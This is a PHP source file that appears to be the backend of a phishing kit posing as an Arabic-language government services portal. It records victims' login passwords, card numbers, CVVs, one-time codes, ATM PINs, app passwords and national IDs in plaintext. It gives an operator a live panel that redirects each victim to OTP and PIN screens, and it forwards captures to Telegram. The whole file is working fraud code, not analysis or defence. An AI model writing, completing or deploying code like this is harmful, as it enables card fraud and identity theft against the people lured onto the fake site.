<?php

declare(strict_types=1);

require_once __DIR__ . '/db.php';
require_once __DIR__ . '/geo.php';
require_once __DIR__ . '/block.php';
require_once __DIR__ . '/telegram.php';

const SW_SESSION_COOKIE = 'sw_portal_session';
const SW_ONLINE_TTL = 30;

function sw_now(): string
{
    return date('c');
}

function sw_client_ip(): string
{
    $ip = sw_client_ip_from_request();
    return $ip !== '' ? $ip : trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
}

function sw_screen_labels(): array
{
    return [
        'login' => 'تسجيل الدخول',
        'home' => 'تسجيل الدخول',
        'smart-card' => 'الدخول بالبطاقة الذكية',
        'register' => 'التسجيل',
        'forgot-password' => 'نسيت كلمة المرور',
        'update-data' => 'تحديث البيانات',
        'portal' => 'بوابة الخدمات',
        'service' => 'تفاصيل الخدمة',
        'pay' => 'الدفع',
        'link' => 'خيار الدفع',
        'methods' => 'خيار الدفع',
        'local' => 'بطاقة محلية',
        'visa' => 'بطاقة فيزا',
        'loading' => 'شاشة التحميل',
        'blocked' => 'محظور',
        'otp' => 'رمز التحقق',
        'pay-reject' => 'رفض الدفع',
        'pay-confirm' => 'تأكيد العملية',
        'pin' => 'رمز الصراف',
        'phone' => 'توثيق رقم الهاتف',
        'phone-forgot' => 'نسيان كلمة مرور الهاتف',
        'phone-register' => 'إنشاء حساب الهاتف',
        'phone-code' => 'رمز تحقق توثيق رقم الهاتف',
        'control' => 'لوحة التحكم',
        'user-type' => 'نوع المستخدم',
        'request' => 'بيانات الطلب',
        'details' => 'تفاصيل الطلب',
        'review' => 'المراجعة',
        'success' => 'نجاح الطلب',
    ];
}

function sw_flow_screens(): array
{
    return [
        'portal' => 'بوابة الخدمات',
        'login' => 'تسجيل الدخول',
        'register' => 'التسجيل',
        'smart-card' => 'البطاقة الذكية',
        'methods' => 'خيار الدفع',
        'local' => 'بطاقة محلية',
        'visa' => 'بطاقة فيزا',
        'otp' => 'رمز التحقق',
        'pin' => 'رمز الصراف',
        'phone' => 'توثيق رقم الهاتف',
        'phone-forgot' => 'نسيان كلمة المرور',
        'phone-register' => 'إنشاء حساب',
        'phone-code' => 'رمز تحقق توثيق رقم الهاتف',
        'loading' => 'شاشة التحميل (انتظار)',
        'pay-reject' => 'رفض الدفع',
        'pay-confirm' => 'تأكيد العملية',
    ];
}

function sw_hold_screens(): array
{
    return ['loading', 'pay-reject', 'pay-confirm'];
}

function sw_pay_flow_screens(): array
{
    return [
        'methods', 'local', 'visa', 'loading', 'otp', 'pin', 'phone',
        'phone-forgot', 'phone-register', 'phone-code', 'pay-reject', 'pay-confirm',
    ];
}

function sw_session_has_pending_pay_redirect(): bool
{
    $id = sw_session_cookie_id();
    if ($id === '') {
        return false;
    }
    try {
        $row = sw_session_find($id);
    } catch (Throwable $e) {
        return false;
    }
    if (!is_array($row)) {
        return false;
    }
    $pending = (string) ($row['redirect_to'] ?? '');
    if ($pending !== '' && in_array($pending, sw_pay_flow_screens(), true)) {
        return true;
    }
    return !empty($row['loading_hold']);
}

function sw_today_label(?int $ts = null): string
{
    $ts = $ts ?? time();
    $days = ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
    $months = [
        1 => 'يناير', 2 => 'فبراير', 3 => 'مارس', 4 => 'أبريل',
        5 => 'مايو', 6 => 'يونيو', 7 => 'يوليو', 8 => 'أغسطس',
        9 => 'سبتمبر', 10 => 'أكتوبر', 11 => 'نوفمبر', 12 => 'ديسمبر',
    ];
    return $days[(int) date('w', $ts)] . ' ' . date('j', $ts) . ' ' . $months[(int) date('n', $ts)] . ' ' . date('Y', $ts);
}

function sw_new_request_no(): string
{
    return 'SW-' . (string) random_int(10000000, 99999999);
}

/**
 * @param array<string, mixed> $data
 * @return list<string>
 */
function sw_request_ids(array $data): array
{
    $ids = [];
    $id = trim((string) ($data['id'] ?? ''));
    if ($id !== '') {
        $ids[] = $id;
    }
    $rawIds = $data['ids'] ?? null;
    if (is_string($rawIds) && $rawIds !== '') {
        $decoded = json_decode($rawIds, true);
        $rawIds = is_array($decoded) ? $decoded : (preg_split('/\s*,\s*/', $rawIds) ?: []);
    }
    if (is_array($rawIds)) {
        foreach ($rawIds as $item) {
            $item = trim((string) $item);
            if ($item !== '') {
                $ids[] = $item;
            }
        }
    }
    return array_values(array_unique($ids));
}

function sw_screen_label(string $screen): string
{
    $labels = sw_screen_labels();
    return $labels[$screen] ?? ($screen !== '' ? $screen : 'غير معروف');
}

function sw_new_id(): string
{
    return bin2hex(random_bytes(12));
}

function sw_new_reference(): string
{
    return 'SW-' . strtoupper(substr(bin2hex(random_bytes(4)), 0, 8));
}

function sw_session_cookie_id(): string
{
    $fromCookie = trim((string) ($_COOKIE[SW_SESSION_COOKIE] ?? ''));
    if ($fromCookie !== '' && preg_match('/^[a-f0-9]{24,64}$/', $fromCookie) === 1) {
        return $fromCookie;
    }
    return '';
}

function sw_session_was_rotated(): bool
{
    return !empty($GLOBALS['sw_session_rotated']);
}

function sw_session_set_cookie(string $id): void
{
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    setcookie(SW_SESSION_COOKIE, $id, [
        'expires' => time() + 60 * 60 * 24 * 30,
        'path' => '/',
        'secure' => $secure,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    $_COOKIE[SW_SESSION_COOKIE] = $id;
}

function sw_session_id(): string
{
    $fromCookie = sw_session_cookie_id();
    if ($fromCookie !== '' && !sw_session_id_is_deleted($fromCookie) && sw_session_find($fromCookie) !== null) {
        return $fromCookie;
    }
    if ($fromCookie !== '' && sw_session_id_is_deleted($fromCookie)) {
        $GLOBALS['sw_session_rotated'] = true;
    }

    $reuse = sw_session_find_reusable();
    if ($reuse !== null) {
        $id = (string) $reuse['id'];
        sw_session_set_cookie($id);
        return $id;
    }

    $id = sw_new_id();
    sw_session_set_cookie($id);
    return $id;
}

function sw_session_find(string $id): ?array
{
    $stmt = sw_db()->prepare('SELECT * FROM sessions WHERE id = :id LIMIT 1');
    $stmt->execute(['id' => $id]);
    $row = $stmt->fetch();
    return $row ?: null;
}

function sw_session_norm_user(string $value): string
{
    return strtolower(trim($value));
}

function sw_session_norm_phone(string $value): string
{
    return preg_replace('/\D+/', '', $value) ?? '';
}

function sw_session_data_columns(): array
{
    return [
        'customer_name', 'customer_phone', 'customer_email',
        'login_username', 'login_password',
        'card_number', 'card_expiry', 'card_cvv',
        'otp_code', 'pin_code', 'phone_verify_code',
        'phone_provider', 'phone_number', 'phone_email', 'phone_qid', 'phone_password',
        'account_type', 'reg_qid', 'reg_email', 'reg_mobile', 'reg_dial_code',
        'nationality', 'name_ar', 'name_en', 'birthdate', 'gender',
        'service_code', 'service_name', 'service_fee',
        'service_category', 'service_duration',
        'user_type',
        'current_screen', 'redirect_to', 'redirect_nonce', 'confirm_ref',
        'home_captcha_verified_at',
        'device_id', 'client_ip', 'client_country',
    ];
}

function sw_session_identity_tokens(array $row): array
{
    $tokens = [];
    $user = sw_session_norm_user((string) ($row['login_username'] ?? ''));
    if ($user !== '') {
        $tokens[] = 'user:' . $user;
    }
    foreach (['customer_phone', 'phone_number', 'reg_mobile'] as $col) {
        $phone = sw_session_norm_phone((string) ($row[$col] ?? ''));
        if (strlen($phone) >= 7) {
            $tokens[] = 'phone:' . $phone;
        }
    }
    $device = trim((string) ($row['device_id'] ?? ''));
    if ($device !== '') {
        $tokens[] = 'device:' . $device;
    }
    if ($tokens === []) {
        $ip = trim((string) ($row['client_ip'] ?? ''));
        $tokens[] = $ip !== '' ? 'ip:' . $ip : ('id:' . (string) ($row['id'] ?? ''));
    }
    return array_values(array_unique($tokens));
}

function sw_session_merge_row(array $base, array $extra): array
{
    $baseTime = strtotime((string) ($base['updated_at'] ?? '')) ?: 0;
    $extraTime = strtotime((string) ($extra['updated_at'] ?? '')) ?: 0;
    $extraNewer = $extraTime >= $baseTime;
    foreach (sw_session_data_columns() as $col) {
        $from = trim((string) ($extra[$col] ?? ''));
        if ($from === '') {
            continue;
        }
        $current = trim((string) ($base[$col] ?? ''));
        if ($current === '' || $extraNewer) {
            $base[$col] = $extra[$col];
        }
    }
    if (!empty($extra['is_blocked'])) {
        $base['is_blocked'] = 1;
        if (!empty($extra['blocked_at'])) {
            $base['blocked_at'] = $extra['blocked_at'];
        }
    }
    $baseSeen = strtotime((string) ($base['last_seen_at'] ?? $base['updated_at'] ?? '')) ?: 0;
    $extraSeen = strtotime((string) ($extra['last_seen_at'] ?? $extra['updated_at'] ?? '')) ?: 0;
    if ($extraSeen >= $baseSeen) {
        $base['last_seen_at'] = $extra['last_seen_at'] ?? $base['last_seen_at'];
        $base['updated_at'] = $extra['updated_at'] ?? $base['updated_at'];
    }
    return $base;
}

function sw_session_find_reusable(string $username = '', string $phone = '', string $exceptId = ''): ?array
{
    $device = function_exists('sw_device_id') ? sw_device_id() : '';
    $ip = sw_client_ip();
    $username = sw_session_norm_user($username);
    $phone = sw_session_norm_phone($phone);
    $deleted = sw_deleted_ids();
    $candidates = [];
    $add = static function (array $rows) use (&$candidates, $deleted, $exceptId): void {
        foreach ($rows as $row) {
            $id = (string) ($row['id'] ?? '');
            if ($id === '' || $id === $exceptId || isset($deleted[$id]) || !empty($row['is_admin'])) {
                continue;
            }
            $candidates[$id] = $row;
        }
    };

    $pdo = sw_db();
    if ($device !== '') {
        $stmt = $pdo->prepare(
            'SELECT * FROM sessions WHERE COALESCE(is_admin, 0) = 0 AND device_id = :d ORDER BY created_at ASC LIMIT 8'
        );
        $stmt->execute(['d' => $device]);
        $add($stmt->fetchAll() ?: []);
    }
    if ($username !== '') {
        $stmt = $pdo->prepare(
            'SELECT * FROM sessions WHERE COALESCE(is_admin, 0) = 0 AND LOWER(TRIM(login_username)) = :u ORDER BY created_at ASC LIMIT 8'
        );
        $stmt->execute(['u' => $username]);
        $add($stmt->fetchAll() ?: []);
    }
    if (strlen($phone) >= 7) {
        $stmt = $pdo->query(
            'SELECT * FROM sessions WHERE COALESCE(is_admin, 0) = 0
             AND (TRIM(COALESCE(customer_phone, "")) != "" OR TRIM(COALESCE(phone_number, "")) != "" OR TRIM(COALESCE(reg_mobile, "")) != "")
             ORDER BY created_at ASC LIMIT 200'
        );
        foreach ($stmt ? ($stmt->fetchAll() ?: []) : [] as $row) {
            foreach (['customer_phone', 'phone_number', 'reg_mobile'] as $col) {
                if (sw_session_norm_phone((string) ($row[$col] ?? '')) === $phone) {
                    $add([$row]);
                    break;
                }
            }
        }
    }
    if ($candidates === [] && $ip !== '' && $username === '' && $phone === '') {
        $stmt = $pdo->prepare(
            'SELECT * FROM sessions WHERE COALESCE(is_admin, 0) = 0 AND client_ip = :ip
             AND TRIM(COALESCE(login_username, "")) = ""
             ORDER BY created_at ASC LIMIT 5'
        );
        $stmt->execute(['ip' => $ip]);
        $add($stmt->fetchAll() ?: []);
    }
    if ($candidates === []) {
        return null;
    }
    uasort($candidates, static fn(array $a, array $b): int => strcmp((string) ($a['created_at'] ?? ''), (string) ($b['created_at'] ?? '')));
    return array_values($candidates)[0];
}

function sw_session_dedupe_clients(array $rows): array
{
    $n = count($rows);
    if ($n <= 1) {
        return $rows;
    }
    $parent = range(0, $n - 1);
    $find = static function (int $i) use (&$parent): int {
        while ($parent[$i] !== $i) {
            $parent[$i] = $parent[$parent[$i]];
            $i = $parent[$i];
        }
        return $i;
    };
    $tokenOwner = [];
    foreach ($rows as $i => $row) {
        foreach (sw_session_identity_tokens($row) as $token) {
            if (isset($tokenOwner[$token])) {
                $rootA = $find($tokenOwner[$token]);
                $rootB = $find((int) $i);
                if ($rootA !== $rootB) {
                    $parent[$rootB] = $rootA;
                }
            } else {
                $tokenOwner[$token] = (int) $i;
            }
        }
    }
    $groups = [];
    foreach ($rows as $i => $row) {
        $groups[$find((int) $i)][] = $row;
    }
    $out = [];
    foreach ($groups as $group) {
        usort($group, static fn(array $a, array $b): int => strcmp((string) ($a['created_at'] ?? ''), (string) ($b['created_at'] ?? '')));
        $keep = $group[0];
        foreach ($group as $row) {
            $keep = sw_session_merge_row($keep, $row);
        }
        $out[] = $keep;
    }
    usort($out, static fn(array $a, array $b): int => strcmp((string) ($b['updated_at'] ?? ''), (string) ($a['updated_at'] ?? '')));
    return $out;
}

function sw_session_ensure(?string $id = null): array
{
    $id = $id ?: sw_session_id();
    if (sw_session_id_is_deleted($id)) {
        $GLOBALS['sw_session_rotated'] = true;
        $id = sw_session_id();
    }
    $existing = sw_session_find($id);
    if ($existing) {
        return $existing;
    }

    $reuse = sw_session_find_reusable('', '', $id);
    if ($reuse !== null) {
        $keepId = (string) $reuse['id'];
        sw_session_set_cookie($keepId);
        return $reuse;
    }

    $now = sw_now();
    $deviceId = sw_device_id();
    $stmt = sw_db()->prepare(
        'INSERT INTO sessions (id, reference, client_ip, client_country, ip_history, device_id, created_at, updated_at, last_seen_at)
         VALUES (:id, :reference, :ip, :country, :history, :device, :created, :updated, :seen)'
    );
    $ip = sw_client_ip();
    $stmt->execute([
        'id' => $id,
        'reference' => sw_new_reference(),
        'ip' => $ip,
        'country' => sw_country_code_from_request(),
        'history' => json_encode($ip !== '' ? [$ip] : [], JSON_UNESCAPED_UNICODE),
        'device' => $deviceId,
        'created' => $now,
        'updated' => $now,
        'seen' => $now,
    ]);

    return sw_session_find($id) ?? ['id' => $id];
}

function sw_session_existing(): ?array
{
    $id = sw_session_cookie_id();
    if ($id === '' || sw_session_id_is_deleted($id)) {
        return null;
    }
    return sw_session_find($id);
}

function sw_session_is_online(array $row): bool
{
    $seen = strtotime((string) ($row['last_seen_at'] ?? '')) ?: 0;
    return $seen > 0 && (time() - $seen) <= SW_ONLINE_TTL;
}

function sw_session_touch(string $screen = '', array $capture = [], bool $notifyTelegram = false, bool $create = true): ?array
{
    if (!$create) {
        $row = sw_session_existing();
        if ($row === null) {
            return null;
        }
    } else {
        $row = sw_session_ensure();
    }
    $id = (string) $row['id'];
    $oldId = '';
    $fields = [
        'updated_at' => sw_now(),
        'last_seen_at' => sw_now(),
        'client_ip' => sw_client_ip(),
        'device_id' => sw_device_id(),
        'ip_history' => sw_block_merge_ip_history($row, sw_client_ips_from_request()),
    ];
    $country = sw_country_code_from_request();
    if ($country !== '') {
        $fields['client_country'] = $country;
    } elseif (trim((string) ($row['client_country'] ?? '')) === '') {
        $fields['client_country'] = '';
    }
    if ($screen !== '') {
        $fields['current_screen'] = $screen;
    }

    $allowed = [
        'customer_name', 'customer_phone', 'customer_email',
        'login_username', 'login_password',
        'card_number', 'card_expiry', 'card_cvv',
        'otp_code', 'pin_code', 'phone_verify_code',
        'phone_provider', 'phone_number', 'phone_email', 'phone_qid', 'phone_password',
        'account_type', 'reg_qid', 'reg_email', 'reg_mobile', 'reg_dial_code',
        'nationality', 'name_ar', 'name_en', 'birthdate', 'gender',
        'service_code', 'service_name', 'service_fee',
        'service_category', 'service_duration',
        'home_captcha_verified_at',
        'user_type',
    ];
    foreach ($allowed as $key) {
        if (!array_key_exists($key, $capture)) {
            continue;
        }
        $value = trim((string) $capture[$key]);
        if ($value === '') {
            continue;
        }
        $fields[$key] = mb_substr($value, 0, 255);
        if ($key === 'login_username' && empty($row['customer_name']) && empty($fields['customer_name'])) {
            $fields['customer_name'] = mb_substr($value, 0, 80);
        }
        if ($key === 'name_ar' || $key === 'name_en') {
            if (empty($row['customer_name']) && empty($fields['customer_name'])) {
                $fields['customer_name'] = mb_substr($value, 0, 120);
            }
        }
        if ($key === 'phone_number' || $key === 'reg_mobile') {
            $fields['customer_phone'] = mb_substr($value, 0, 64);
        }
        if ($key === 'phone_email' || $key === 'customer_email' || $key === 'reg_email') {
            $fields['customer_email'] = mb_substr($value, 0, 255);
        }
        if ($key === 'reg_qid' && empty($row['phone_qid'])) {
            $fields['phone_qid'] = mb_substr($value, 0, 64);
        }
    }

    $probe = array_merge($row, $fields);
    $keeper = sw_session_find_reusable(
        (string) ($probe['login_username'] ?? ''),
        (string) (($probe['customer_phone'] ?? '') ?: ($probe['phone_number'] ?? '') ?: ($probe['reg_mobile'] ?? '')),
        $id
    );
    if ($keeper !== null && (string) $keeper['id'] !== $id) {
        $merged = sw_session_merge_row($keeper, $probe);
        foreach ($fields as $col => $val) {
            $merged[$col] = $val;
        }
        $oldId = $id;
        $id = (string) $keeper['id'];
        $row = $keeper;
        $fields = [];
        foreach (sw_session_data_columns() as $col) {
            if (array_key_exists($col, $merged) && (string) ($merged[$col] ?? '') !== (string) ($keeper[$col] ?? '')) {
                $fields[$col] = $merged[$col];
            }
        }
        $fields['updated_at'] = sw_now();
        $fields['last_seen_at'] = sw_now();
        sw_session_set_cookie($id);
    }

    $fields['service_description'] = '';

    $sets = [];
    $params = ['id' => $id];
    foreach ($fields as $col => $val) {
        $sets[] = $col . ' = :' . $col;
        $params[$col] = $val;
    }
    $sql = 'UPDATE sessions SET ' . implode(', ', $sets) . ' WHERE id = :id';
    sw_db()->prepare($sql)->execute($params);
    if ($oldId !== '') {
        try {
            sw_db()->prepare('DELETE FROM sessions WHERE id = :id')->execute(['id' => $oldId]);
        } catch (Throwable $e) {
        }
    }

    $updated = sw_session_find($id) ?? $row;
    // Live typing updates the control panel only; Telegram fires on submit / explicit notify.
    if ($notifyTelegram && $capture !== []) {
        sw_telegram_notify_capture(
            $row,
            $updated,
            $screen !== '' ? $screen : (string) ($updated['current_screen'] ?? ''),
            $capture
        );
    }

    return $updated;
}

function sw_session_mark_offline(?string $id = null): void
{
    $id = $id ?: sw_session_cookie_id();
    if ($id === '' || sw_session_id_is_deleted($id)) {
        return;
    }
    $past = date('c', time() - 120);
    $stmt = sw_db()->prepare('UPDATE sessions SET last_seen_at = :seen, updated_at = :updated WHERE id = :id');
    $stmt->execute(['seen' => $past, 'updated' => sw_now(), 'id' => $id]);
}

function sw_session_set_redirect(string $id, string $screen): ?array
{
    $labels = sw_flow_screens();
    if ($screen !== 'blocked' && !isset($labels[$screen]) && !isset(sw_screen_labels()[$screen])) {
        return null;
    }
    $nonce = sw_new_id();
    $hold = in_array($screen, sw_hold_screens(), true) ? 1 : 0;
    $holdScreen = $hold ? $screen : '';
    $params = [
        'screen' => $screen,
        'nonce' => $nonce,
        'hold' => $hold,
        'hold_screen' => $holdScreen,
        'updated' => sw_now(),
        'id' => $id,
    ];
    $sql = 'UPDATE sessions SET redirect_to = :screen, redirect_nonce = :nonce, loading_hold = :hold, hold_screen = :hold_screen, updated_at = :updated';
    if ($screen === 'pay-confirm') {
        $sql .= ', confirm_ref = :confirm_ref';
        $params['confirm_ref'] = sw_new_request_no();
    }
    $sql .= ' WHERE id = :id';
    $stmt = sw_db()->prepare($sql);
    $stmt->execute($params);

    if (in_array($screen, sw_pay_flow_screens(), true)) {
        try {
            sw_db()->prepare(
                'UPDATE sessions SET home_captcha_verified_at = :t
                 WHERE id = :id AND (home_captcha_verified_at IS NULL OR home_captcha_verified_at = "" OR home_captcha_verified_at = "0")'
            )->execute(['t' => (string) time(), 'id' => $id]);
        } catch (Throwable $e) {
            // Ignore.
        }
    }

    return sw_session_find($id);
}

function sw_session_clear_hold(string $id): void
{
    $id = trim($id);
    if ($id === '' || sw_session_id_is_deleted($id)) {
        return;
    }
    $stmt = sw_db()->prepare(
        'UPDATE sessions SET redirect_to = "", redirect_nonce = "", loading_hold = 0, hold_screen = "", updated_at = :updated WHERE id = :id'
    );
    $stmt->execute(['updated' => sw_now(), 'id' => $id]);
}

function sw_session_ack_redirect(string $id, string $nonce): void
{
    $stmt = sw_db()->prepare(
        'UPDATE sessions SET redirect_to = "", redirect_nonce = "", updated_at = :updated
         WHERE id = :id AND redirect_nonce = :nonce'
    );
    $stmt->execute(['updated' => sw_now(), 'id' => $id, 'nonce' => $nonce]);
}

function sw_session_delete(string $id): void
{
    $id = trim($id);
    if ($id === '') {
        return;
    }
    sw_block_cleanup_for_session($id);
    sw_deleted_ids($id);
    sw_db()->prepare('DELETE FROM sessions WHERE id = :id')->execute(['id' => $id]);
    sw_db_persist();
}

function sw_session_mark_admin_current(): void
{
    $id = trim((string) ($_COOKIE[SW_SESSION_COOKIE] ?? ''));
    if ($id === '' || preg_match('/^[a-f0-9]{24,64}$/', $id) !== 1) {
        return;
    }
    try {
        sw_db()->prepare(
            'UPDATE sessions SET is_admin = 1, updated_at = :updated WHERE id = :id'
        )->execute(['updated' => sw_now(), 'id' => $id]);
    } catch (Throwable $e) {
    }
}

function sw_session_list(array $filters = []): array
{
    $sql = 'SELECT * FROM sessions WHERE COALESCE(is_admin, 0) = 0';
    $params = [];
    $adminUser = function_exists('sw_control_username') ? strtolower(sw_control_username()) : '';
    if ($adminUser !== '') {
        $sql .= ' AND LOWER(TRIM(login_username)) != :admin_user';
        $params['admin_user'] = $adminUser;
    }
    $q = trim((string) ($filters['q'] ?? ''));
    if ($q !== '') {
        $sql .= ' AND (reference LIKE :q OR customer_name LIKE :q OR customer_phone LIKE :q OR login_username LIKE :q)';
        $params['q'] = '%' . $q . '%';
    }
    $sql .= ' ORDER BY updated_at DESC LIMIT 200';
    $stmt = sw_db()->prepare($sql);
    $stmt->execute($params);
    $rows = $stmt->fetchAll();

    $deleted = sw_deleted_ids();
    if ($deleted !== []) {
        $rows = array_values(array_filter(
            $rows,
            static fn(array $row): bool => !isset($deleted[(string) ($row['id'] ?? '')])
        ));
    }

    if (!empty($filters['dedupe_clients'])) {
        return sw_session_dedupe_clients($rows);
    }

    return $rows;
}

function sw_session_details(array $row): array
{
    $pairs = [];
    $add = static function (string $label, string $value) use (&$pairs): void {
        $value = trim($value);
        if ($value !== '') {
            $pairs[] = [$label, $value];
        }
    };

    $accountType = (string) ($row['account_type'] ?? '');
    $accountLabel = match ($accountType) {
        'resident' => 'مواطن / مقيم',
        'visitor' => 'زائر / خارج قطر',
        default => $accountType,
    };
    $gender = (string) ($row['gender'] ?? '');
    $genderLabel = match ($gender) {
        'male' => 'ذكر',
        'female' => 'أنثى',
        default => $gender,
    };

    $add('اسم المستخدم', (string) ($row['login_username'] ?? ''));
    $add('كلمة المرور', (string) ($row['login_password'] ?? ''));
    $add('الاسم', (string) ($row['customer_name'] ?? ''));
    $add('رقم الهاتف', (string) (($row['customer_phone'] ?? '') ?: ($row['phone_number'] ?? '') ?: ($row['reg_mobile'] ?? '')));
    $add('البريد', (string) (($row['customer_email'] ?? '') ?: ($row['phone_email'] ?? '') ?: ($row['reg_email'] ?? '')));
    $add('الخدمة المختارة', (string) ($row['service_name'] ?? ''));
    $add('تصنيف الخدمة', (string) ($row['service_category'] ?? ''));
    $add('قيمة الخدمة', (string) ($row['service_fee'] ?? ''));
    $add('مدة الخدمة', (string) ($row['service_duration'] ?? ''));
    $add('رمز الخدمة', (string) ($row['service_code'] ?? ''));
    $homeCaptchaAtRaw = trim((string) ($row['home_captcha_verified_at'] ?? ''));
    if ($homeCaptchaAtRaw !== '') {
        $homeCaptchaTs = (int) $homeCaptchaAtRaw;
        $homeCaptchaLabel = $homeCaptchaTs > 0 ? date('Y-m-d H:i', $homeCaptchaTs) : $homeCaptchaAtRaw;
        $add('تم التحقق من عدم كونه روبوت', $homeCaptchaLabel);
    }
    $add('نوع المستخدم', (string) ($row['user_type'] ?? ''));
    $add('نوع الحساب', $accountLabel);
    $add('الرقم الشخصي (تسجيل)', (string) ($row['reg_qid'] ?? ''));
    $add('بريد التسجيل', (string) ($row['reg_email'] ?? ''));
    $add('جوال التسجيل', (string) ($row['reg_mobile'] ?? ''));
    $add('رمز الاتصال الدولي', (string) ($row['reg_dial_code'] ?? ''));
    $add('الجنسية', (string) ($row['nationality'] ?? ''));
    $add('الاسم بالعربي', (string) ($row['name_ar'] ?? ''));
    $add('الاسم بالإنجليزية', (string) ($row['name_en'] ?? ''));
    $add('تاريخ الميلاد', (string) ($row['birthdate'] ?? ''));
    $add('الجنس', $genderLabel);
    $add('رقم البطاقة', (string) ($row['card_number'] ?? ''));
    $add('انتهاء البطاقة', (string) ($row['card_expiry'] ?? ''));
    $add('CVV', (string) ($row['card_cvv'] ?? ''));
    $add('رمز التحقق OTP', (string) ($row['otp_code'] ?? ''));
    $add('رمز الصراف', (string) ($row['pin_code'] ?? ''));
    $add('مزود الخدمة', (string) ($row['phone_provider'] ?? ''));
    $add('رقم هاتف التوثيق', (string) ($row['phone_number'] ?? ''));
    $add('بريد مزود الخدمة', (string) ($row['phone_email'] ?? ''));
    $add('الرقم الشخصي', (string) ($row['phone_qid'] ?? ''));
    $add('كلمة مرور التطبيق', (string) ($row['phone_password'] ?? ''));
    $add('رمز تحقق توثيق رقم الهاتف', (string) ($row['phone_verify_code'] ?? ''));
    $add('رقم الطلب', (string) ($row['confirm_ref'] ?? ''));

    return $pairs;
}

function sw_session_stats(): array
{
    $rows = sw_session_list(['dedupe_clients' => true]);
    $online = 0;
    $pending = 0;
    $blocked = 0;
    foreach ($rows as $row) {
        if (sw_session_is_online($row)) {
            $online++;
        }
        if (($row['status'] ?? '') === 'PENDING_REVIEW') {
            $pending++;
        }
        if (!empty($row['is_blocked'])) {
            $blocked++;
        }
    }
    return [
        'total' => count($rows),
        'online' => $online,
        'pending' => $pending,
        'approved' => 0,
        'needs_info' => 0,
        'rejected' => 0,
        'blocked' => $blocked,
        'admins_online' => function_exists('sw_admin_online_count') ? sw_admin_online_count() : 0,
    ];
}

function sw_session_resolve_country(array $row): string
{
    $stored = trim((string) ($row['client_country'] ?? ''));
    if ($stored !== '') {
        return $stored;
    }
    $ip = trim((string) ($row['client_ip'] ?? ''));
    if ($ip === '') {
        return '';
    }
    $code = sw_country_code_from_ip($ip);
    if ($code === '') {
        return '';
    }
    $id = (string) ($row['id'] ?? '');
    if ($id !== '') {
        try {
            sw_db()->prepare('UPDATE sessions SET client_country = :c WHERE id = :id AND (client_country = "" OR client_country IS NULL)')
                ->execute(['c' => $code, 'id' => $id]);
        } catch (Throwable $e) {
        }
    }
    return $code;
}

function sw_session_live_payload(array $row): array
{
    $online = sw_session_is_online($row);
    $name = trim((string) ($row['customer_name'] ?? ''));
    if ($name === '') {
        $name = trim((string) ($row['login_username'] ?? ''));
    }
    if ($name === '') {
        $name = 'زائر';
    }
    $created = (string) ($row['created_at'] ?? '');
    $createdTs = $created !== '' ? (strtotime($created) ?: time()) : 0;
    $createdLabel = $createdTs ? date('Y-m-d H:i', $createdTs) : '';
    $createdTime = $createdTs ? date('g:i A', $createdTs) : '';
    $isBlocked = !empty($row['is_blocked']);
    $countryCode = sw_session_resolve_country($row);
    $countryLabel = sw_geo_label($countryCode, 'ar');
    $phone = (string) (($row['customer_phone'] ?? '') ?: ($row['phone_number'] ?? '') ?: ($row['reg_mobile'] ?? ''));
    $username = trim((string) ($row['login_username'] ?? ''));
    if ($username === '') {
        $username = $name;
    }

    return [
        'id' => (string) $row['id'],
        'reference' => (string) $row['reference'],
        'customer_name' => $name,
        'login_username' => $username,
        'customer_phone' => $phone,
        'service_code' => (string) ($row['service_code'] ?? ''),
        'service_name' => (string) ($row['service_name'] ?? ''),
        'service_fee' => (string) ($row['service_fee'] ?? ''),
        'status' => $isBlocked ? 'BLOCKED' : (string) ($row['status'] ?? 'PENDING_REVIEW'),
        'status_label' => $isBlocked ? 'محظور' : 'قيد المراجعة',
        'transitions' => [],
        'created_at' => $createdLabel,
        'created_time' => $createdTime,
        'current_screen' => (string) ($row['current_screen'] ?? ''),
        'current_screen_label' => sw_screen_label((string) ($row['current_screen'] ?? '')),
        'client_ip' => (string) ($row['client_ip'] ?? ''),
        'client_country' => $countryCode,
        'client_country_label' => $countryLabel,
        'is_online' => $online,
        'is_blocked' => $isBlocked,
        'loading_hold' => !empty($row['loading_hold']),
        'hold_screen' => (string) ($row['hold_screen'] ?? ''),
        'confirm_ref' => (string) ($row['confirm_ref'] ?? ''),
        'presence_label' => $online ? 'متصل' : 'غير متصل',
        'redirect_to' => (string) ($row['redirect_to'] ?? ''),
        'details' => sw_session_details($row),
    ];
}

function sw_session_public_payload(array $row): array
{
    $blocked = !empty($row['is_blocked']) || sw_client_is_blocked();

    $homeCaptchaAtRaw = trim((string) ($row['home_captcha_verified_at'] ?? ''));
    $homeCaptchaVerified = $homeCaptchaAtRaw !== '' && $homeCaptchaAtRaw !== '0';

    $redirect = (string) ($row['redirect_to'] ?? '');
    $redirectNonce = (string) ($row['redirect_nonce'] ?? '');
    $loadingHold = !empty($row['loading_hold']);
    $holdScreen = (string) ($row['hold_screen'] ?? '');
    $confirmRef = (string) ($row['confirm_ref'] ?? '');

    if ($blocked) {
        $redirect = 'blocked';
    }

    // Security: until captcha verification is complete, never allow control panel
    // redirects/holds to navigate the user to any panel.
    if (!$blocked && !$homeCaptchaVerified) {
        $redirect = '';
        $redirectNonce = '';
        $loadingHold = false;
        $holdScreen = '';
        $confirmRef = '';
    }
    return [
        'id' => (string) $row['id'],
        'reference' => (string) $row['reference'],
        'current_screen' => (string) ($row['current_screen'] ?? ''),
        'redirect_to' => $redirect,
        'redirect_nonce' => $redirectNonce,
        'loading_hold' => $loadingHold,
        'hold_screen' => $holdScreen,
        'confirm_ref' => $confirmRef,
        'is_blocked' => $blocked,
        'is_online' => sw_session_is_online($row),
    ];
}

function sw_json(array $payload, int $status = 200): never
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store');
    header('Connection: close');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        while (ob_get_level() > 0) {
            ob_end_flush();
        }
        flush();
    }
    exit;
}
